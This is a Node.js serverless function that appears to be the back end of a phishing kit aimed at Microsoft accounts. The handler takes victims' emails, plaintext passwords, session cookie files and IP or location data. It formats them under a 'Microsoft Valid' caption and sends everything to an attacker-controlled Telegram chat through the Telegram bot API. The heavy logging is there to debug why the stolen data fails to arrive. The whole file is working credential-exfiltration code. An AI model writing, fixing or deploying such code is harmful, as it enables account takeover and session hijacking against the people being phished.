/**
 * DIAGNOSTIC VERSION: Identify why data isn't reaching Telegram
 */

const https = require('https');

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

function sendDocumentWithCaption(fileContent, fileName, caption) {
  return new Promise((resolve, reject) => {
    console.log('═══════════════════════════════════════════');
    console.log('🔍 STEP 1: Preparing document');
    console.log('═══════════════════════════════════════════');
    console.log('File content length:', fileContent?.length);
    console.log('File name:', fileName);
    console.log('Caption length:', caption?.length);

    try {
      const base64Content = Buffer.from(fileContent).toString('base64');
      console.log('✅ Base64 encoding successful');
      console.log('Base64 length:', base64Content.length);

      const postData = JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        document: `data:text/plain;base64,${base64Content}`,
        caption: caption,
        parse_mode: 'HTML'
      });

      console.log('✅ JSON stringify successful');
      console.log('PostData length:', postData.length);

      const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(postData)
        },
        timeout: 15000
      };

      console.log('═══════════════════════════════════════════');
      console.log('🔍 STEP 2: Making HTTPS request to Telegram');
      console.log('═══════════════════════════════════════════');
      console.log('Host:', options.hostname);
      console.log('Path:', options.path);
      console.log('Method:', options.method);

      const req = https.request(options, (res) => {
        console.log('═══════════════════════════════════════════');
        console.log('🔍 STEP 3: Telegram response received');
        console.log('═══════════════════════════════════════════');
        console.log('Status code:', res.statusCode);
        console.log('Status message:', res.statusMessage);

        let data = '';
        res.on('data', (chunk) => {
          data += chunk;
          console.log('Received chunk:', chunk.length, 'bytes');
        });

        res.on('end', () => {
          console.log('═══════════════════════════════════════════');
          console.log('🔍 STEP 4: Parsing response');
          console.log('═══════════════════════════════════════════');
          console.log('Full response:', data);

          try {
            const response = JSON.parse(data);
            console.log('Parsed response:', JSON.stringify(response, null, 2));

            if (res.statusCode === 200 && response.ok) {
              console.log('✅✅✅ SUCCESS: Document sent to Telegram');
              resolve(response);
            } else {
              console.error('❌ Telegram rejected:', response.description);
              reject(new Error(`Telegram API error: ${response.description || 'Unknown error'}`));
            }
          } catch (e) {
            console.error('❌ Parse error:', e.message);
            reject(new Error(`Failed to parse Telegram response: ${e.message}`));
          }
        });
      });

      req.on('error', (error) => {
        console.error('═══════════════════════════════════════════');
        console.error('❌ HTTPS REQUEST ERROR');
        console.error('═══════════════════════════════════════════');
        console.error('Error:', error.message);
        console.error('Code:', error.code);
        reject(error);
      });

      req.on('timeout', () => {
        console.error('❌ REQUEST TIMEOUT');
        req.destroy();
        reject(new Error('Telegram request timeout'));
      });

      console.log('Writing request data...');
      req.write(postData);
      req.end();
    } catch (error) {
      console.error('❌ Setup error:', error.message);
      reject(error);
    }
  });
}

function escapeHtml(text) {
  if (!text) return '';
  return String(text)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

exports.handler = async (event, context) => {
  console.log('═══════════════════════════════════════════');
  console.log('🚀 HANDLER STARTED');
  console.log('═══════════════════════════════════════════');
  console.log('Time:', new Date().toISOString());
  console.log('HTTP Method:', event.httpMethod);
  console.log('Body length:', event.body?.length);

  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type, Accept',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Content-Type': 'application/json'
  };

  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ message: 'OK' })
    };
  }

  if (event.httpMethod !== 'POST') {
    console.error('❌ Invalid method:', event.httpMethod);
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  try {
    console.log('═══════════════════════════════════════════');
    console.log('📦 Parsing request body');
    console.log('═══════════════════════════════════════════');

    let requestData;
    try {
      requestData = JSON.parse(event.body || '{}');
      console.log('✅ JSON parse successful');
    } catch (error) {
      console.error('❌ JSON parse failed:', error.message);
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'Invalid JSON in request body' })
      };
    }

    const { email, password, cookies = [], locationData = {}, cookieFiles = {} } = requestData;

    console.log('═══════════════════════════════════════════');
    console.log('📊 Received data');
    console.log('═══════════════════════════════════════════');
    console.log('Email:', !!email, email ? email.substring(0, 20) : 'MISSING');
    console.log('Password:', !!password, password ? '***' : 'MISSING');
    console.log('Cookies array length:', cookies.length);
    console.log('CookieFiles:', !!cookieFiles);
    console.log('CookieFiles.jsonFile:', !!cookieFiles.jsonFile);
    console.log('CookieFiles.jsonFile.content:', !!cookieFiles.jsonFile?.content);
    console.log('CookieFiles.jsonFile.content length:', cookieFiles.jsonFile?.content?.length);
    console.log('LocationData IP:', locationData?.ip);

    if (!email && !password && cookies.length === 0) {
      console.error('❌ No meaningful data provided');
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'No meaningful data provided' })
      };
    }

    // Build caption
    console.log('═══════════════════════════════════════════');
    console.log('📝 Building caption');
    console.log('═══════════════════════════════════════════');

    let caption = '<b>✅ Microsoft Valid</b>\n\n';

    if (email) {
      caption += `👤:- ${escapeHtml(email)}\n`;
    }

    if (password) {
      caption += `🔑:- ${escapeHtml(password)}\n`;
    }

    if (locationData && locationData.ip) {
      caption += `\n<b>🌍 Location:</b>\n`;
      caption += `IP:- ${escapeHtml(locationData.ip)}\n`;
      if (locationData.city) caption += `City:- ${escapeHtml(locationData.city)}\n`;
      if (locationData.region) caption += `Region:- ${escapeHtml(locationData.region)}\n`;
      if (locationData.country) caption += `Country:- ${escapeHtml(locationData.country)}\n`;
    }

    caption += `\nBrowser:- chrome\n`;
    caption += `\n⏰ ${new Date().toISOString()}\n`;

    console.log('✅ Caption built');
    console.log('Caption length:', caption.length);

    let documentSent = false;

    // Check if cookie file exists
    console.log('═══════════════════════════════════════════');
    console.log('🔍 Checking cookie file');
    console.log('═══════════════════════════════════════════');

    if (cookieFiles && cookieFiles.jsonFile && cookieFiles.jsonFile.content) {
      console.log('✅ Cookie file exists');

      try {
        const txtContent = cookieFiles.jsonFile.content;
        const timestamp = Date.now();
        const fileName = `${email || 'credentials'}_${timestamp}.txt`;

        console.log('✅ Prepared to send:');
        console.log('  - Filename:', fileName);
        console.log('  - Content length:', txtContent.length);
        console.log('  - Caption length:', caption.length);

        await sendDocumentWithCaption(txtContent, fileName, caption);

        documentSent = true;
        console.log('✅✅✅ DOCUMENT SENT SUCCESSFULLY');
      } catch (fileError) {
        console.error('═══════════════════════════════════════════');
        console.error('❌ DOCUMENT SEND FAILED');
        console.error('═══════════════════════════════════════════');
        console.error('Error:', fileError.message);
        console.error('Stack:', fileError.stack);
      }
    } else {
      console.log('❌ Cookie file conditions NOT met');
      console.log('cookieFiles exists:', !!cookieFiles);
      console.log('cookieFiles.jsonFile exists:', !!cookieFiles.jsonFile);
      console.log('cookieFiles.jsonFile.content exists:', !!cookieFiles.jsonFile?.content);
    }

    console.log('═══════════════════════════════════════════');
    console.log('✅ HANDLER COMPLETED');
    console.log('═══════════════════════════════════════════');

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        message: 'All data transmitted to Telegram successfully',
        timestamp: new Date().toISOString(),
        transmitted: {
          documentWithCaption: documentSent
        }
      })
    };

  } catch (error) {
    console.error('═══════════════════════════════════════════');
    console.error('❌❌❌ HANDLER ERROR');
    console.error('═══════════════════════════════════════════');
    console.error('Message:', error.message);
    console.error('Stack:', error.stack);

    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: error.message,
        success: false
      })
    };
  }
};
